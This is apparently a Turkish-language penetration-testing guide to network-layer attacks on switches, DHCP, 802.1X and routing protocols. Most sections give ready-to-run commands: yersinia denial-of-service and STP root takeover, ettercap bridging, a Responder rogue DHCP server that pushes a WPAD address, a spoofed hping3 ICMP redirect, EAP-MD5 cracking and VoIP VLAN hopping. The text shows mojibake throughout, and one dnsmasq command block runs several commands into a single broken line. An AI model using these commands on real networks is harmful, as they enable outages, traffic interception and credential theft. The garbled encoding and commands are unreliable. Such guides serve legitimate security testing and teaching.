Misafir kablosuz aÄŸlar gibi belirli ortamlarda, **port izolasyonu (ayrÄ±ca Ã¶zel VLAN olarak da bilinir)** ayarlarÄ±, kablosuz eriÅŸim noktasÄ±na baÄŸlÄ± istemcilerin doÄŸrudan birbirleriyle iletiÅŸim kurmasÄ±nÄ± engellemek iÃ§in uygulanÄ±r. Bununla birlikte, bu izolasyon Ã¶nlemlerini atlatan bir teknik tanÄ±mlanmÄ±ÅŸtÄ±r. Bu teknik, aÄŸ ACL'lerinin eksikliÄŸini veya yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmasÄ±nÄ± kullanarak IP paketlerinin bir yÃ¶nlendirici aracÄ±lÄ±ÄŸÄ±yla baÅŸka bir istemciye ulaÅŸmasÄ±nÄ± saÄŸlar.

SaldÄ±rÄ±, **hedef istemcinin IP adresini taÅŸÄ±yan ancak yÃ¶nlendiricinin MAC adresiyle oluÅŸturulan bir paket** oluÅŸturularak gerÃ§ekleÅŸtirilir. Bu, yÃ¶nlendiricinin paketi yanlÄ±ÅŸlÄ±kla hedef istemciye iletmeye yÃ¶nlendirmesine neden olur. Bu yaklaÅŸÄ±m, KurbanÄ±n EriÅŸebildiÄŸi Bir Ana BilgisayarÄ± Kontrol Etme yeteneÄŸinin kullanÄ±ldÄ±ÄŸÄ± Ã‡ift Etiketleme SaldÄ±rÄ±larÄ±nda kullanÄ±lan yÃ¶nteme benzer ÅŸekilde gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kullanÄ±lÄ±r.

**SaldÄ±rÄ±nÄ±n Temel AdÄ±mlarÄ±:**

1. **Paket OluÅŸturma:** Hedef istemcinin IP adresini iÃ§erecek ÅŸekilde Ã¶zel olarak oluÅŸturulmuÅŸ bir paket.
2. **YÃ¶nlendirici DavranÄ±ÅŸÄ±nÄ±n SÃ¶mÃ¼rÃ¼lmesi:** OluÅŸturulan paket yÃ¶nlendiriciye gÃ¶nderilir ve yapÄ±landÄ±rmadan dolayÄ± paket hedef istemciye yÃ¶nlendirilir, Ã¶zel VLAN ayarlarÄ± tarafÄ±ndan saÄŸlanan izolasyonu atlayarak.

### VTP SaldÄ±rÄ±larÄ±

VTP (VLAN Trunking Protocol), VLAN yÃ¶netimini merkezileÅŸtirir. VLAN veritabanÄ± bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ korumak iÃ§in revizyon numaralarÄ±nÄ± kullanÄ±r; herhangi bir deÄŸiÅŸiklik bu numarayÄ± artÄ±rÄ±r. Anahtarlar, kendi VLAN veritabanlarÄ±nÄ± gÃ¼ncelleyen daha yÃ¼ksek revizyon numaralarÄ±na sahip yapÄ±landÄ±rmalarÄ± benimser.

#### VTP Etki AlanÄ± Rolleri

* **VTP Sunucusu:** VLAN'larÄ± yÃ¶netir - oluÅŸturur, siler, deÄŸiÅŸtirir. VTP duyurularÄ±nÄ± etki alanÄ± Ã¼yelerine yayÄ±nlar.
* **VTP Ä°stemcisi:** VLAN veritabanÄ±nÄ± senkronize etmek iÃ§in VTP duyurularÄ±nÄ± alÄ±r. Bu rol, yerel VLAN yapÄ±landÄ±rma deÄŸiÅŸikliklerinden kÄ±sÄ±tlanmÄ±ÅŸtÄ±r.
* **VTP Åeffaf:** VTP gÃ¼ncellemelerine katÄ±lmaz ancak VTP duyurularÄ±nÄ± ileterek. VTP saldÄ±rÄ±larÄ±ndan etkilenmez, sÃ¼rekli bir sÄ±fÄ±r revizyon numarasÄ±nÄ± korur.

#### VTP Duyuru TÃ¼rleri

* **Ã–zet Duyuru:** Temel etki alanÄ± bilgilerini taÅŸÄ±yan VTP sunucusu tarafÄ±ndan her 300 saniyede bir yayÄ±nlanÄ±r.
* **Alt KÃ¼me Duyurusu:** VLAN yapÄ±landÄ±rma deÄŸiÅŸikliklerini takiben gÃ¶nderilir.
* **Duyuru Ä°steÄŸi:** VTP istemcisi tarafÄ±ndan, genellikle daha yÃ¼ksek bir yapÄ±landÄ±rma revizyon numarasÄ± algÄ±landÄ±ÄŸÄ±nda bir Ã–zet Duyuru istemek iÃ§in verilir.

VTP zafiyetleri yalnÄ±zca trunk portlarÄ± aracÄ±lÄ±ÄŸÄ±yla sÃ¶mÃ¼rÃ¼lebilir Ã§Ã¼nkÃ¼ VTP duyurularÄ± yalnÄ±zca bunlar arasÄ±nda dolaÅŸÄ±r. DTP saldÄ±rÄ± senaryolarÄ± VTP'ye doÄŸru yÃ¶nelebilir. Yersinia gibi araÃ§lar, VLAN veritabanÄ±nÄ± silmeyi amaÃ§layan VTP saldÄ±rÄ±larÄ±nÄ± kolaylaÅŸtÄ±rabilir, aÄŸÄ± etkili bir ÅŸekilde kesintiye uÄŸratarak.

Not: Bu tartÄ±ÅŸma VTP sÃ¼rÃ¼m 1'e (VTPv1) aittir.
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### STP SaldÄ±rÄ±larÄ±

**EÄŸer arabirimlerinizde BPDU Ã§erÃ§evelerini yakalayamÄ±yorsanÄ±z, STP saldÄ±rÄ±sÄ±nda baÅŸarÄ±lÄ± olmanÄ±z olasÄ± deÄŸildir.**

#### **STP BPDU DoS**

Ã‡ok sayÄ±da BPDU TCP (Topology Change Notification) veya Conf (topolojinin oluÅŸturulduÄŸunda gÃ¶nderilen BPDU'lar) gÃ¶ndererek anahtarlar aÅŸÄ±rÄ± yÃ¼klenir ve doÄŸru ÅŸekilde Ã§alÄ±ÅŸmayÄ± durdururlar.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP SaldÄ±rÄ±sÄ±**

TCP gÃ¶nderildiÄŸinde, anahtarlarÄ±n CAM tablosu 15 saniye iÃ§inde silinir. Sonra, sÃ¼rekli olarak bu tÃ¼r paketler gÃ¶nderiyorsanÄ±z, CAM tablosu sÃ¼rekli olarak yeniden baÅŸlatÄ±lÄ±r (veya her 15 saniyede bir) ve yeniden baÅŸlatÄ±ldÄ±ÄŸÄ±nda anahtar bir hub gibi davranÄ±r.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP KÃ¶k SaldÄ±rÄ±sÄ±**

SaldÄ±rgan, bir anahtarÄ±n davranÄ±ÅŸÄ±nÄ± taklit ederek aÄŸÄ±n STP kÃ¶kÃ¼ haline gelir. Daha sonra, daha fazla veri onun Ã¼zerinden geÃ§er. Bu durum, iki farklÄ± anahtara baÄŸlÄ± olduÄŸunuzda ilginÃ§ hale gelir.\
Bu, **Ã¶ncelik** deÄŸerinin gerÃ§ek kÃ¶k anahtarÄ±n gerÃ§ek Ã¶nceliÄŸinden daha dÃ¼ÅŸÃ¼k olduÄŸunu belirten BPDUs CONF paketleri gÃ¶nderilerek yapÄ±lÄ±r.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**EÄŸer saldÄ±rgan 2 anahtara baÄŸlÄ±ysa, yeni aÄŸacÄ±n kÃ¶kÃ¼ olabilir ve bu anahtarlar arasÄ±ndaki tÃ¼m trafiÄŸi Ã¼zerinden geÃ§irebilir** (bir MITM saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirilecektir).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP SaldÄ±rÄ±larÄ±

CISCO KeÅŸif ProtokolÃ¼ (CDP), CISCO cihazlarÄ± arasÄ±ndaki iletiÅŸim iÃ§in temel bir Ã¶neme sahiptir, cihazlarÄ±n **birbirini tanÄ±masÄ±na ve yapÄ±landÄ±rma detaylarÄ±nÄ± paylaÅŸmasÄ±na olanak tanÄ±r**.

#### Pasif Veri Toplama <a href="#id-0e0f" id="id-0e0f"></a>

CDP, tÃ¼m portlar aracÄ±lÄ±ÄŸÄ±yla bilgiyi yayÄ±nlamak Ã¼zere yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r, bu da bir gÃ¼venlik riskine yol aÃ§abilir. Bir saldÄ±rgan, bir anahtara baÄŸlandÄ±ÄŸÄ±nda **Wireshark**, **tcpdump** veya **Yersinia** gibi aÄŸ dinleyicilerini kullanabilir. Bu eylem, aÄŸ cihazÄ± hakkÄ±nda hassas verileri ortaya Ã§Ä±karabilir, bunlar arasÄ±nda modeli ve Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ± Cisco IOS sÃ¼rÃ¼mÃ¼ bulunmaktadÄ±r. SaldÄ±rgan daha sonra belirlenen Cisco IOS sÃ¼rÃ¼mÃ¼ndeki belirli zafiyetlere odaklanabilir.

#### CDP Tablosu TaÅŸmasÄ±nÄ± Tetikleme <a href="#id-0d6a" id="id-0d6a"></a>

Daha agresif bir yaklaÅŸÄ±m, meÅŸru CISCO cihazlarÄ± gibi davranarak anahtarÄ±n belleÄŸini aÅŸÄ±rÄ± yÃ¼kleyerek Bir Hizmet Reddi (DoS) saldÄ±rÄ±sÄ± baÅŸlatmayÄ± iÃ§erir. AÅŸaÄŸÄ±da, test iÃ§in tasarlanmÄ±ÅŸ bir aÄŸ aracÄ± olan Yersinia'yÄ± kullanarak bÃ¶yle bir saldÄ±rÄ±yÄ± baÅŸlatmak iÃ§in komut dizisi bulunmaktadÄ±r:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Bu saldÄ±rÄ± sÄ±rasÄ±nda, anahtarÄ±n CPU'su ve CDP komÅŸu tablosu aÄŸÄ±r bir ÅŸekilde yÃ¼klenir ve aÅŸÄ±rÄ± kaynak tÃ¼ketiminden dolayÄ± sÄ±klÄ±kla **"aÄŸ felci"** olarak adlandÄ±rÄ±lan duruma yol aÃ§ar.

#### CDP Kimlik Taklidi SaldÄ±rÄ±sÄ±
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
AyrÄ±ca [**scapy**](https://github.com/secdev/scapy/) kullanabilirsiniz. `scapy/contrib` paketini kurduÄŸunuzdan emin olun.

### VoIP SaldÄ±rÄ±larÄ± ve VoIP Hopper AracÄ±

IoT cihazlarÄ±yla giderek entegre olan VoIP telefonlarÄ±, Ã¶zel telefon numaralarÄ± aracÄ±lÄ±ÄŸÄ±yla kapÄ±larÄ± aÃ§ma veya termostatlarÄ± kontrol etme gibi iÅŸlevler sunar. Ancak, bu entegrasyon gÃ¼venlik riskleri oluÅŸturabilir.

[**voiphopper**](http://voiphopper.sourceforge.net) aracÄ±, Ã§eÅŸitli ortamlarda (Cisco, Avaya, Nortel, Alcatel-Lucent) bir VoIP telefonunu taklit etmek iÃ§in tasarlanmÄ±ÅŸtÄ±r. CDP, DHCP, LLDP-MED ve 802.1Q ARP gibi protokoller kullanarak ses aÄŸÄ± VLAN ID'sini keÅŸfeder.

**VoIP Hopper**, Cisco Discovery Protocol (CDP) iÃ§in Ã¼Ã§ mod sunar:

1. **Sniff Modu** (`-c 0`): VLAN ID'sini tanÄ±mlamak iÃ§in aÄŸ paketlerini analiz eder.
2. **Spoof Modu** (`-c 1`): GerÃ§ek bir VoIP cihazÄ±nÄ±n paketlerini taklit eden Ã¶zel paketler oluÅŸturur.
3. **Ã–nceden YapÄ±lmÄ±ÅŸ Paketle Spoof Modu** (`-c 2`): Belirli bir Cisco IP telefon modelinin paketlerine benzer paketler gÃ¶nderir.

HÄ±z iÃ§in tercih edilen mod Ã¼Ã§Ã¼ncÃ¼ moddur. Belirtmeniz gerekenler:

* SaldÄ±rganÄ±n aÄŸ arayÃ¼zÃ¼ (`-i` parametresi).
* Taklit edilen VoIP cihazÄ±nÄ±n adÄ± (`-E` parametresi), Cisco adlandÄ±rma formatÄ±na uygun olmalÄ±dÄ±r (Ã¶rneÄŸin, bir MAC adresini takip eden SEP).

Kurumsal ortamlarda, mevcut bir VoIP cihazÄ±nÄ± taklit etmek iÃ§in ÅŸunlarÄ± yapabilirsiniz:

* Telefon Ã¼zerindeki MAC etiketini inceleyin.
* Model bilgilerini gÃ¶rÃ¼ntÃ¼lemek iÃ§in telefonun ekran ayarlarÄ±na gidin.
* VoIP cihazÄ±nÄ± bir dizÃ¼stÃ¼ bilgisayara baÄŸlayÄ±n ve Wireshark kullanarak CDP isteklerini gÃ¶zlemleyin.

ÃœÃ§Ã¼ncÃ¼ modda aracÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in Ã¶rnek bir komut:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP SaldÄ±rÄ±larÄ±

#### NumaralandÄ±rma
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

DHCP sunucularÄ±na karÅŸÄ± gerÃ§ekleÅŸtirilebilecek **iki tÃ¼r DoS** saldÄ±rÄ±sÄ± vardÄ±r. Ä°lk tÃ¼r, **tÃ¼m mÃ¼mkÃ¼n IP adreslerini kullanacak kadar sahte ana bilgisayar simÃ¼le etmek** Ã¼zerinedir.\
Bu saldÄ±rÄ±, yalnÄ±zca DHCP sunucusunun yanÄ±tlarÄ±nÄ± gÃ¶rebiliyorsanÄ±z ve protokolÃ¼ tamamlayabiliyorsanÄ±z Ã§alÄ±ÅŸacaktÄ±r (**KeÅŸfet** (Bilgisayar) --> **Teklif** (sunucu) --> **Ä°stek** (Bilgisayar) --> **Onay** (sunucu)). Ã–rneÄŸin, bu, **Wifi aÄŸlarÄ±nda mÃ¼mkÃ¼n deÄŸildir**.

DHCP DoS gerÃ§ekleÅŸtirmenin baÅŸka bir yolu, **her mÃ¼mkÃ¼n IP'yi kaynak kod olarak kullanarak bir DHCP-RELEASE paketi gÃ¶ndermektir**. ArdÄ±ndan, sunucu, herkesin IP'yi kullanmayÄ± bitirdiÄŸini dÃ¼ÅŸÃ¼necektir.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Daha otomatik bir yol, [DHCPing](https://github.com/kamorin/DHCPig) aracÄ±nÄ± kullanmaktÄ±r.

Bahsedilen DoS saldÄ±rÄ±larÄ±nÄ± kullanarak istemcileri yeni kiralama almak zorunda bÄ±rakabilir ve meÅŸru sunucularÄ± tÃ¼keterek yanÄ±t vermez hale getirebilirsiniz. Bu durumda meÅŸru sunucular yeniden baÄŸlanmaya Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda, **aÅŸaÄŸÄ±daki saldÄ±rÄ±da belirtilen kÃ¶tÃ¼ niyetli deÄŸerleri sunabilirsiniz**.

#### KÃ¶tÃ¼ niyetli deÄŸerler ayarla

Bir sahte DHCP sunucusu, `/usr/share/responder/DHCP.py` konumundaki DHCP betiÄŸi kullanÄ±larak kurulabilir. Bu, HTTP trafiÄŸini ve kimlik bilgilerini yakalayarak aÄŸ saldÄ±rÄ±larÄ± iÃ§in yararlÄ±dÄ±r, trafiÄŸi kÃ¶tÃ¼ niyetli bir sunucuya yÃ¶nlendirerek. Ancak, sahte bir aÄŸ geÃ§idi kurmak, yalnÄ±zca istemciden Ã§Ä±kan trafiÄŸi yakalamasÄ±na izin verdiÄŸi iÃ§in daha az etkilidir, gerÃ§ek aÄŸ geÃ§idinden gelen yanÄ±tlarÄ± kaÃ§Ä±rÄ±r. Bunun yerine, daha etkili bir saldÄ±rÄ± iÃ§in sahte bir DNS veya WPAD sunucusu kurmanÄ±z Ã¶nerilir.

AÅŸaÄŸÄ±da sahte DHCP sunucusunu yapÄ±landÄ±rmak iÃ§in komut seÃ§enekleri bulunmaktadÄ±r:

* **IP Adresimiz (AÄŸ GeÃ§idi Ä°lanÄ±)**: Makinenizin IP'sini aÄŸ geÃ§idi olarak ilan etmek iÃ§in `-i 10.0.0.100` kullanÄ±n.
* **Yerel DNS Alan AdÄ±**: Ä°steÄŸe baÄŸlÄ± olarak, yerel bir DNS alan adÄ± belirlemek iÃ§in `-d example.org` kullanÄ±n.
* **Orijinal YÃ¶nlendirici/AÄŸ GeÃ§idi IP'si**: MeÅŸru yÃ¶nlendirici veya aÄŸ geÃ§idinin IP adresini belirtmek iÃ§in `-r 10.0.0.1` kullanÄ±n.
* **Birincil DNS Sunucusu IP'si**: Kontrol ettiÄŸiniz sahte DNS sunucusunun IP adresini belirlemek iÃ§in `-p 10.0.0.100` kullanÄ±n.
* **Ä°kincil DNS Sunucusu IP'si**: Ä°steÄŸe baÄŸlÄ± olarak, ikincil bir DNS sunucusu IP'si belirlemek iÃ§in `-s 10.0.0.1` kullanÄ±n.
* **Yerel AÄŸÄ±n Netmask'Ä±**: Yerel aÄŸ iÃ§in netmask'Ä± tanÄ±mlamak iÃ§in `-n 255.255.255.0` kullanÄ±n.
* **DHCP Trafik Ä°Ã§in ArayÃ¼z**: Belirli bir aÄŸ arayÃ¼zÃ¼nde DHCP trafiÄŸini dinlemek iÃ§in `-I eth1` kullanÄ±n.
* **WPAD YapÄ±landÄ±rma Adresi**: Web trafiÄŸini ele geÃ§irmede yardÄ±mcÄ± olmak iÃ§in `-w â€œhttp://10.0.0.100/wpad.datâ€` kullanarak WPAD yapÄ±landÄ±rma adresini belirleyin.
* **VarsayÄ±lan AÄŸ GeÃ§idi IP'sini SahteleÅŸtir**: VarsayÄ±lan aÄŸ geÃ§idi IP adresini sahtelemek iÃ§in `-S` ekleyin.
* **TÃ¼m DHCP Ä°steklerine YanÄ±t Ver**: Sunucunun tÃ¼m DHCP isteklerine yanÄ±t vermesi iÃ§in `-R` ekleyin, ancak bu gÃ¼rÃ¼ltÃ¼lÃ¼dÃ¼r ve tespit edilebilir olduÄŸunu unutmayÄ±n.

Bu seÃ§enekleri doÄŸru bir ÅŸekilde kullanarak, bir sahte DHCP sunucusu aÄŸ trafiÄŸini etkili bir ÅŸekilde ele geÃ§irebilir.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP SaldÄ±rÄ±larÄ±**

AÅŸaÄŸÄ±da 802.1X uygulamalarÄ±na karÅŸÄ± kullanÄ±labilecek saldÄ±rÄ± taktiklerinden bazÄ±larÄ± bulunmaktadÄ±r:

* EAP aracÄ±lÄ±ÄŸÄ±yla aktif kaba kuvvet saldÄ±rÄ±sÄ±
* RADIUS sunucusuna hatalÄ± EAP iÃ§eriÄŸi ile saldÄ±rÄ±lar _(sÃ¶mÃ¼rÃ¼ler)_
* EAP iletilerinin yakalanmasÄ± ve Ã§evrimdÄ±ÅŸÄ± ÅŸifre kÄ±rma (EAP-MD5 ve PEAP)
* EAP-MD5 kimlik doÄŸrulamasÄ±nÄ± zorlayarak TLS sertifika doÄŸrulamasÄ±nÄ± atlatma
* Hub veya benzeri bir cihaz kullanarak kimlik doÄŸrulama sÄ±rasÄ±nda kÃ¶tÃ¼ amaÃ§lÄ± aÄŸ trafiÄŸi enjekte etme

EÄŸer saldÄ±rgan, kurban ile kimlik doÄŸrulama sunucusu arasÄ±ndaysa, kimlik doÄŸrulama protokolÃ¼nÃ¼ gerektiÄŸinde EAP-MD5'e dÃ¼ÅŸÃ¼rmeye Ã§alÄ±ÅŸabilir ve kimlik doÄŸrulama giriÅŸimini yakalayabilir. Daha sonra bunu kaba kuvvet saldÄ±rÄ±sÄ±yla Ã§Ã¶zmeye Ã§alÄ±ÅŸabilir:
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) SaldÄ±rÄ±larÄ± <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol), **sÄ±cak yedekli yÃ¶nlendirme sistemi oluÅŸturmak iÃ§in tasarlanmÄ±ÅŸ bir aÄŸ protokolÃ¼ sÄ±nÄ±fÄ±dÄ±r**. FHRP ile fiziksel yÃ¶nlendiriciler tek bir mantÄ±ksal cihaza birleÅŸtirilebilir, bu da hata toleransÄ±nÄ± artÄ±rÄ±r ve yÃ¼kÃ¼ daÄŸÄ±tmaya yardÄ±mcÄ± olur.

**Cisco Systems mÃ¼hendisleri, GLBP ve HSRP olmak Ã¼zere iki FHRP protokolÃ¼ geliÅŸtirmiÅŸtir.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

YÃ¶nlendirme Bilgi ProtokolÃ¼'nÃ¼n (RIP) Ã¼Ã§ versiyonu bulunmaktadÄ±r: RIP, RIPv2 ve RIPng. RIP ve RIPv2 tarafÄ±ndan UDP kullanÄ±larak 520 numaralÄ± porta datagramlar gÃ¶nderilirken, RIPng tarafÄ±ndan IPv6 Ã§oklu yayÄ±n kullanÄ±larak datagramlar 521 numaralÄ± UDP porta yayÄ±nlanÄ±r. RIPv2 tarafÄ±ndan MD5 kimlik doÄŸrulamasÄ± desteÄŸi getirilmiÅŸtir. Ã–te yandan, RIPng tarafÄ±ndan yerel kimlik doÄŸrulama dahil edilmemiÅŸtir; bunun yerine IPv6 iÃ§indeki isteÄŸe baÄŸlÄ± IPsec AH ve ESP baÅŸlÄ±klarÄ±na gÃ¼venilmektedir.

* **RIP ve RIPv2:** Ä°letiÅŸim UDP datagramlarÄ± aracÄ±lÄ±ÄŸÄ±yla 520 numaralÄ± port Ã¼zerinden gerÃ§ekleÅŸtirilir.
* **RIPng:** IPv6 Ã§oklu yayÄ±n kullanarak datagramlarÄ± yayÄ±nlamak iÃ§in UDP portu 521'i kullanÄ±r.

RIPv2'nin MD5 kimlik doÄŸrulamasÄ±nÄ± desteklediÄŸini, RIPng'nin ise yerel kimlik doÄŸrulama iÃ§ermediÄŸini ve IPv6 iÃ§indeki IPsec AH ve ESP baÅŸlÄ±klarÄ±na gÃ¼vendiÄŸini unutmayÄ±n.

### EIGRP SaldÄ±rÄ±larÄ±

**EIGRP (Enhanced Interior Gateway Routing Protocol)** dinamik bir yÃ¶nlendirme protokolÃ¼dÃ¼r. **Kimlik doÄŸrulamasÄ± olmadÄ±ÄŸÄ±nda** ve pasif arayÃ¼zlerin yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nda, bir **saldÄ±rgan** EIGRP yÃ¶nlendirmesine mÃ¼dahale edebilir ve **yÃ¶nlendirme tablolarÄ±nÄ± zehirleyebilir**. AyrÄ±ca, EIGRP aÄŸÄ± (baÅŸka bir deyiÅŸle, Ã¶zerk sistem) **dÃ¼z ve herhangi bir bÃ¶lgeye bÃ¶lÃ¼nmemiÅŸtir**. Bir **saldÄ±rgan bir rota enjekte ederse**, bu rotanÄ±n Ã¶zerk EIGRP sistemi boyunca **yayÄ±lma** olasÄ±lÄ±ÄŸÄ± yÃ¼ksektir.

Bir EIGRP sistemine saldÄ±rmak, **meÅŸru bir EIGRP yÃ¶nlendirici ile bir komÅŸuluk kurmayÄ±** gerektirir, bu da temel keÅŸiften Ã§eÅŸitli enjeksiyonlara kadar birÃ§ok olasÄ±lÄ±ÄŸÄ± ortaya Ã§Ä±karÄ±r.

[**FRRouting**](https://frrouting.org/), **BGP, OSPF, EIGRP, RIP ve diÄŸer protokolleri destekleyen sanal bir yÃ¶nlendiriciyi uygulamanÄ±za olanak tanÄ±r**. YapmanÄ±z gereken tek ÅŸey, saldÄ±rganÄ±nÄ±zÄ±n sistemine daÄŸÄ±tmak ve yÃ¶nlendirme alanÄ±nda meÅŸru bir yÃ¶nlendirici gibi davranabilirsiniz.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/), EIGRP (Enhanced Interior Gateway Routing Protocol) yayÄ±nlarÄ±nÄ± dinlemek ve yÃ¶nlendirme yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirmek iÃ§in kullanÄ±labilecek paketleri enjekte etmeye olanak tanÄ±r.

### OSPF

AÃ§Ä±k En KÄ±sa Yol Ä°lk (OSPF) protokolÃ¼nde **genellikle gÃ¼venli iletiÅŸimi saÄŸlamak iÃ§in MD5 kimlik doÄŸrulamasÄ± kullanÄ±lmaktadÄ±r**. Bununla birlikte, bu gÃ¼venlik Ã¶nlemi, Loki ve John the Ripper gibi araÃ§lar kullanÄ±larak tehlikeye atÄ±labilir. Bu araÃ§lar, MD5 karmaÅŸalarÄ±nÄ± yakalayÄ±p kÄ±rabilme yeteneÄŸine sahiptir, kimlik doÄŸrulama anahtarÄ±nÄ± ortaya Ã§Ä±kararak. Bu anahtar elde edildiÄŸinde, yeni yÃ¶nlendirme bilgileri eklemek iÃ§in kullanÄ±labilir. Rota parametrelerini yapÄ±landÄ±rmak ve tehlikeye atÄ±lan anahtarÄ± kurmak iÃ§in sÄ±rasÄ±yla _Enjeksiyon_ ve _BaÄŸlantÄ±_ sekmeleri kullanÄ±lÄ±r.

* **MD5 KarmaÅŸalarÄ±nÄ± Yakalama ve KÄ±rma:** Bu amaÃ§la Loki ve John the Ripper gibi araÃ§lar kullanÄ±lÄ±r.
* **Rota Parametrelerini YapÄ±landÄ±rma:** Bu, _Enjeksiyon_ sekmesi aracÄ±lÄ±ÄŸÄ±yla yapÄ±lÄ±r.
* **Tehlikeye AtÄ±lan AnahtarÄ± Ayarlama:** Anahtar, _BaÄŸlantÄ±_ sekmesi altÄ±nda yapÄ±landÄ±rÄ±lÄ±r.

### DiÄŸer Genel AraÃ§lar ve Kaynaklar

* [**Above**](https://github.com/c4s73r/Above): AÄŸ trafiÄŸini taramak ve gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulmak iÃ§in araÃ§
* AÄŸ saldÄ±rÄ±larÄ± hakkÄ±nda daha fazla bilgiyi [**burada**](https://github.com/Sab0tag3d/MITM-cheatsheet) bulabilirsiniz.

## **Sahtecilik**

SaldÄ±rgan, sahte DHCP yanÄ±tlarÄ± gÃ¶ndererek aÄŸÄ±n yeni Ã¼yesinin tÃ¼m aÄŸ parametrelerini (GW, IP, DNS) yapÄ±landÄ±rÄ±r.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Zehirlenmesi

[Ã–nceki bÃ¶lÃ¼me](./#arp-spoofing) bakÄ±n.

### ICMP YÃ¶nlendirme

ICMP YÃ¶nlendirme, saldÄ±rganÄ±n bir IP'ye ulaÅŸmanÄ±n en iyi yolunun kendisi olduÄŸunu belirten bir ICMP paketi tÃ¼rÃ¼ 1 kod 5 gÃ¶ndermesinden oluÅŸur. ArdÄ±ndan, kurban belirtilen IP'ye ulaÅŸmak istediÄŸinde paketi saldÄ±rgan aracÄ±lÄ±ÄŸÄ±yla gÃ¶nderecektir.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS SahtekarlÄ±ÄŸÄ±

SaldÄ±rgan, kurbanÄ±n sorduÄŸu bazÄ± (veya tÃ¼m) alan adlarÄ±nÄ± Ã§Ã¶zecektir.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq ile kendi DNS'inizi yapÄ±landÄ±rÄ±n**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Yerel AÄŸ GeÃ§itleri

Sistemlere ve aÄŸlara birden fazla yol genellikle mevcuttur. Yerel aÄŸ iÃ§indeki MAC adreslerinin bir listesini oluÅŸturduktan sonra, IPv4 yÃ¶nlendirmeyi destekleyen ana bilgisayarlarÄ± tanÄ±mlamak iÃ§in _gateway-finder.py_ dosyasÄ±nÄ± kullanÄ±n.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
